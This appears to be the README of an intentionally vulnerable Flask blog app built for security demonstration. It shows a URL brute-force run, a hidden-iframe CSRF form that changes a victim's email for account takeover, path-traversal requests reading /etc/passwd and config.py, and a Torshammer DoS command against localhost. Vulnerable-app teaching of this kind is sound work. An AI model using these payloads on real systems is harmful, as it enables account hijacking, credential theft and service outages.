# Setup
- For Linux.
- Download Python 3.6+ version and install.
- Go inside the project directory and open in terminal.
- Follow steps to create a virtual environment in your system (optional) 
    - Run command `pip install virtualenv` to install virtual package manager
    - Make a virtual environment using command `virtualenv env`
    - Now activate your virtual environment: `source env/bin/activate`
    
- Install all project dependencies: `pip install -r requirements.txt` or `pip3 install -r requirements.txt`
- Finally, run application: `python app.py` or  `python3 app.py`

<br>

# Insecure Application

## 1. Broken access control and priviledge escalation due to improper authorization:
1. Attacker finds the admin login page using bruteforce.
Attacker has a list of popular API endpoints.<br>
```
python3 bruteforce-url.py
/admin 200
/admin/ 200
/login 200
/user/login 405
```

2. Attacker logs in as a normal user and then tries to access admin page. Due to improper authorization, attacker is granted access.


## 2. Gain Access Hijacking 
An attacker can go through all the APIs used by the Blogging application and try to find vulnerabilities. Here, they will find an API which is used 

Creating a hidden form that exploits the API that updates the user profile. Attacker places the form in the blog's content; whenever a user clicks on the button, its email is changed. Later attacker can use the forgot password feature to change the password.

Attacker can inspect the update-profile page to learn the working of the API call; then create a fake HTML form with attackers details.
```
<style>
    .hide { position:absolute; top:-1px; left:-1px; width:1px; height:1px; }
</style>
  
<iframe name="hiddenFrame" class="hide"></iframe>
  
<form action="/user/update" method="post" target="hiddenFrame">
    <input type="text" name="email" id="update-email" value="srtkrwt@gmail.com" style="display: none;"><br>
    <button type="submit" id="signup-button">Check out this video!!</button>
</form>
```

## 3. Sensitive data access
All the profile pictures are stored on the server. The webpage sends a POST request to fetch the picture. The attacker exploits this. He can send mallicious file name in the request, like "../../../../../../../ect/passwd" or "../../config.py" 

Attacker can inspect the update-profile page to learn the working of the API call that fetches the profile picture; then send requests containing malicious filename.

```
This will return  profile picture of user="user001"

POST http://127.0.0.1:5000/profile_picture
Content-Type: application/json

{
    "picture_name": "user001"
}

###
This will return etc/passwd file 

POST http://127.0.0.1:5000/profile_picture
Content-Type: application/json

{
    "picture_name": "../../../../../../../../../etc/passwd"
}

###
This will return config.py file of the application.

POST http://127.0.0.1:5000/profile_picture
Content-Type: application/json

{
    "picture_name": "../../config.py"
}
```

## 4. Denial Of Service attack
Attacker can DOS the server, this makes the services unavailable the the normal users.
We used Torshammer to perform the DOS attack.<br>
`python2 torshammer.py -t 127.0.0.1 -p 5000` 